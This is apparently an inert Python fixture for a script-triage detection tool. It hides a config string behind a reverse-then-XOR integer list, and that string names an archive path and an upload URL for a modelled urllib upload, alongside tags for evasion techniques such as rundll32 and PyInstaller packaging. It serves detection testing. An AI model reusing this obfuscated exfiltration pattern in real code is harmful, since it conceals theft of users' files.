# configuration reconstruction
#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_2ff52c98 = [175, 182, 165, 241, 235, 188, 233, 236, 187, 235, 189, 234, 230, 238, 242, 186, 183, 188, 190, 188, 240, 189, 190, 147, 172, 172, 186, 173, 171, 177, 170, 151, 240, 190, 171, 190, 155, 178, 190, 173, 184, 176, 173, 143, 240, 229, 156, 226, 183, 171, 190, 175, 128, 186, 169, 182, 183, 188, 173, 190, 163, 187, 190, 176, 179, 175, 170, 240, 187, 182, 179, 190, 169, 177, 182, 241, 186, 179, 175, 178, 190, 167, 186, 241, 235, 188, 233, 236, 187, 235, 189, 234, 230, 238, 240, 240, 229, 172, 175, 171, 171, 183, 226, 179, 173, 170, 128, 187, 190, 176, 179, 175, 170, 163, 235, 188, 233, 236, 187, 235, 189, 234, 230, 238, 242, 177, 184, 182, 190, 175, 178, 190, 188, 226, 187, 182, 128, 177, 184, 182, 190, 175, 178, 190, 188, 163, 173, 176, 172, 172, 186, 188, 186, 187, 186, 173, 175, 128, 237, 236, 179, 179, 187, 177, 170, 173, 226, 177, 182, 190, 183, 188, 128, 172, 168, 176, 187, 177, 182, 168, 163, 173, 182, 187, 186, 177, 176, 128, 173, 186, 179, 179, 190, 171, 172, 177, 182, 166, 175, 226, 173, 186, 182, 173, 173, 190, 188, 163, 177, 176, 182, 171, 188, 186, 173, 182, 187, 177, 182, 128, 190, 187, 189, 178, 190, 179, 226, 177, 176, 182, 171, 190, 188, 172, 170, 185, 189, 176, 163, 183, 188, 171, 190, 175, 172, 182, 187, 128, 166, 173, 190, 177, 176, 182, 171, 188, 182, 187, 226, 167, 190, 171, 177, 166, 172, 163, 238, 226, 171, 177, 170, 176, 188, 128, 186, 184, 190, 171, 172, 163, 166, 187, 176, 189, 128, 171, 172, 186, 170, 174, 186, 173, 128, 189, 182, 179, 179, 173, 170, 226, 173, 186, 171, 175, 190, 187, 190, 163, 186, 171, 176, 178, 186, 173, 128, 171, 182, 178, 172, 177, 190, 173, 171, 243, 186, 169, 182, 183, 188, 173, 190, 128, 186, 187, 176, 188, 177, 186, 243, 179, 190, 188, 176, 179, 128, 171, 188, 186, 179, 179, 176, 188, 226, 172, 175, 186, 171, 172, 163, 237, 226, 169]
CODEC_2ff52c98 = "integer_list|reverse_then_xor|df"

def load_2ff52c98():
    return bytes(MATERIAL_2ff52c98)

def decode_2ff52c98(item1):
    return bytes(value ^ 223 for value in reversed(item1))

def recover_2ff52c98():
    item4 = os.environ.get("HUNTRESS_FIXTURE_CONTEXT", "host")
    try:
        item2 = decode_2ff52c98(load_2ff52c98())
    except (TypeError, ValueError) as error:
        raise RuntimeError("configuration recovery failed") from error
    item3 = item2.decode("ascii", "strict")
    return item3

def inspect_2ff52c98():
    view = memoryview(recover_2ff52c98().encode("ascii"))
    return bytes(view).decode("ascii")

def surface_2ff52c98():
    routes = {"selected": lambda: ("dictionary_dispatch", "lambda_indirection", "pyinstaller_onedir", "rundll32_predecessor")}
    return routes["selected"]()

def obfuscation_2ff52c98():
    recover = lambda value: value
    return recover("lambda_indirection")

def plan_2ff52c98():
    fields = dict(item.split("=", 1) for item in inspect_2ff52c98().split("|"))
    analysis_surface = surface_2ff52c98()
    obfuscation_surface = obfuscation_2ff52c98()
    operation_plan = ("urllib_request_body", fields["archive_path"], fields["upload_url"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_2ff52c98())

# reconstruction complete